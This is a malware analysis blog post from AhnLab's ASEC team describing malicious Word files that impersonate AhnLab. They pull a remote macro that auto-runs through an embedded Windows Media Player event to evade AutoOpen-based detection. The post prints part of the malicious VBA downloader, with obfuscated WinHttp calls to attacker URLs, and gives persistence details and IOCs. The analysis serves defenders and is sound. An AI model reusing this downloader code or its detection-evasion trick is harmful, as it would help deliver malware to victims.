<div>
Posted on <a href="https://asec.ahnlab.com/en/33477/" rel="bookmark" title="9:39 am">April 5, 2022</a>
<h1 class="title">Malicious Word Documents Using MS Media Player (Impersonating AhnLab)</h1>
<p>Last week, the ASEC analysis team uploaded a post named “<a href="https://asec.ahnlab.com/en/33186/" rel="noreferrer noopener" target="_blank">Malicious Word File Targeting Corporate Users Being Distributed</a>” that contained information about a malicious Word file. Currently, documents of the same type are being distributed with text that impersonates AhnLab. The Word files confirmed this time download another Word file containing malicious VBA macro via the external URL and run it. Another difference is that the additionally downloaded Word file uses the Windows Media Player() function instead of AutoOpen() to automatically run the VBA macro. It appears the attackers adopted a measure to bypass anti-malware products that detect automatic execution of the AutoOpen() function-based macro.</p>
<p>The confirmed filenames are as follows:
– NFT split.docx
– 202203_BTC_ETH_additional account info.docx
– Complaint for fund-raising business without permission.docx
– Fund-raising without permission.docx
– BTC_ETH automated trading account info.docx 
– Cryptocurrency_investment plan.docx </p>
<p> </p>
<p>Upon running the Word file, a Word macro (dotm) file is downloaded via the external URL in the word\_rels\settings.xml.rels file and executed.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/settin.png?resize=1024%2C121&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/settin.png?resize=1024%2C121&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Inside settings.xml.rels</figcaption></figure>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/external_download.png?w=442&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/external_download.png?w=442&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 2. Word file attempting to access external URL</figcaption></figure>
<p>The downloaded file contains a macro as shown below. The attacker inserted an image and text to prompt users to press Enable Content.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EA%B7%B8%EB%A6%BC1-1.png?resize=1024%2C358&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EA%B7%B8%EB%A6%BC1-1.png?resize=1024%2C358&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. Word file content</figcaption></figure>
<p>When users click Enable Content, the malicious VBA macro that exists inside the externally-downloaded Word file is run.
The macro is written using the WindowsMediaPlayer1_OpenStateChange() function instead of AutoOpen() that was used in the previously detected Word documents. This function is executed when the openState property of the Windows Media Player object changes. When it is run, it performs malicious activities via the RunFE() function just like in previous cases. The following shows a part of the VBA macro code.</p>
<code class="language-js">Private Function RunFE() As Long
 Dim MR As Object
 Dim bbb As String
 Dim i As Long
 Randomize
 Call Init
 For i = 0 To 8: bbb = bbb &amp; Chr(Map1(Int(62 * Rnd()))): Next i
 Set MR = CreateObject(DecodeSTR("tw7v/v2UF6/h4I4v9cL5sgLww+yTE6+Dp9E=")) 'WinHttp.WinHttpRequest.5.1
 Call MR.SetTimeouts(0, 2000, 2000, 5000)
 #If Win64 Then
 MR.Open "GET", DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCv9RJ4NXk") &amp; "?" &amp; bbb &amp; "=" &amp; bbb 'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm
 #Else
 MR.Open "GET", DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCutJJ4NXk") &amp; "?" &amp; bbb &amp; "=" &amp; bbb 'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm
 #End If
&lt;생략&gt;
Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)
 If bFlag = False Then
 Call CTD
 Dim rfRes As Long
 rfRes = RunFE()
 If rfRes = 1 Then
 bFlag = True
 End If
 End If
End Sub</code>
<p>Opening the Word document downloaded through the external URL shows Windows Media Player within the file. The file contains Windows Media Player named WindowsMediaPlayer1 as shown below.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/media%EC%9B%8C%EB%93%9C.png?resize=1024%2C641&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/media%EC%9B%8C%EB%93%9C.png?resize=1024%2C641&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 4. Inside the additionally downloaded Word file</figcaption></figure>
<p>The attacker enabled the AutoPlay option for the Player so that the WindowsMediaPlayer1_OpenStateChange() function is automatically run. When the Player is run, WindowsMediaPlayer1_OpenStateChange() inside the VBA macro is executed, commencing malicious activities even if the user does not perform additional tasks for the Player. Ultimately, as the attacker set the Player to run automatically, the malicious macro is automatically run when the user clicks the Enable Content button.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/wordactiveXactiveX1.xml_.png?resize=768%2C216&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/wordactiveXactiveX1.xml_.png?resize=768%2C216&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 5. Inside word\activeX\activeX1.xml</figcaption></figure>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EB%AF%B8%EB%94%94%EC%96%B4-%EC%86%8D%EC%84%B1.png?resize=768%2C726&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EB%AF%B8%EB%94%94%EC%96%B4-%EC%86%8D%EC%84%B1.png?resize=768%2C726&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 6. WindowsMediaPlayer1’s properties</figcaption></figure>
<p>Malicious activities that are performed by the macro code are the same as those explained in the previous blog post. It downloads additional malware that suits the user’s PC environment and runs it after injecting it into the Word process.</p>
<p>Download URL
– X86 environment: hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm
– X64 environment: hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm</p>
<p>Afterward, it drops USOService.exe into the %ProgramData%\USOShared\Logs folder and runs it. Then it adds the file as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WUService registry so that it can be continuously run.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/create_exe.png?w=930&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/create_exe.png?w=930&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 7. Created executable</figcaption></figure>
<p>The dotm file that was downloaded from the external URL of the additionally confirmed Word document ‘Complaint for fund-raising business without permission.docx’ creates the message box shown below if the macro is enabled. The Word file creates a malicious file named UpdateChecker.exe into the \AppData\Local\Microsoft\Office\ folder. It seems that the attacker drops malware in various folders including the %ProgramData% folder.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/sucess.png?w=1000&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/sucess.png?w=1000&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 8. Message box that appears when successfully accessing download URL</figcaption></figure>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/internet_fail.png?w=1001&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/internet_fail.png?w=1001&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 9. Message box that appears when failed to access download URL</figcaption></figure>
<p>Attacks using Word files are being continuously discovered recently. As seen from the cases impersonating AhnLab to prompt users to enable macros, the attackers are using various images and content to trick people. One should take caution when enabling content for the file.</p>
<p>AhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the following aliases.</p>
<p>[File Detection]
Downloader/DOC.Akdoor
Downloadaer/XML.Generic
Trojan/Win.Generic.C5025270</p>
<p>[IOC]
<a href="">ce00749c908de017010055a83ac0654f
783e7c3ba39daa28301b841785794d76
2fec0c6ff8af4484471633aeaa1c9996
6df608342938f0d30a058c48bb9d8d4d
hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm
hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm
hxxp://naveicoipc[.]tech/ACMS/0nXbQs2e/topAccounts?uid=rt6i45sd
hxxp://naveicoipd[.]tech/ACMS/018ueCdS/blockchainTemplate
hxxp://bcvbert.naveicoipe[.]tech/ACMS/01AweT9Z/wwwTemplate?uid=glvrdta
hxxp://wrhehdfg.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate0330?vvvid=rehs4344s
hxxp://msldkopw.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate03301?vvvid=zxzdfherh
hxxp://uktyukb.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate03304?vvvid=cvnrturr
hxxp://gowelknx.naveicoipf[.]online/ACMS/07RRwrwK/securityTemplate0?securityID=ffsdwiefwe
hxxp://xjowihgnxcvb.naveicoipf[.]online/ACMS/07RRwrwK/securityTemplate3?securityID=cbvkoweoigwk</a></p>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<p><a href="https://atip.ahnlab.com/main" rel="noreferrer noopener" target="_blank"></a></p>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/tag/vba-macro/" rel="tag">VBA Macro</a>, <a href="https://asec.ahnlab.com/en/tag/word-en/" rel="tag">Word</a></p>
</div>